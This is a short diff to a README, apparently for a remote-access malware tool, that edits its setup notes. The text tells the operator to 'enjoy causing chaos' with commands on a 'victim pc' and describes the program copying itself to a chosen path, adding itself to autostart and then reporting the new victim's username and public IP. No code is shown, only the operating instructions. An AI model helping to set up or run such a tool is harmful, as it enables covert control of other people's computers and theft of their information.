@@ -56,7 +56,8 @@
 * enjoy causing chaos, use your [commands](#commands) on victim pc
 
 ### Autostart
-* if you have turned it on you can put your executable whenever you want, it will automaticly copy it self to %temp% and add to autostart
+* enter your path to features.cpp -> PATH
+* if you have turned it on you can put your executable whenever you want, it will automaticly copy it self to  your path and add to autostart
 * after that it will send info about new user, username and public ip
 
 ### Commands
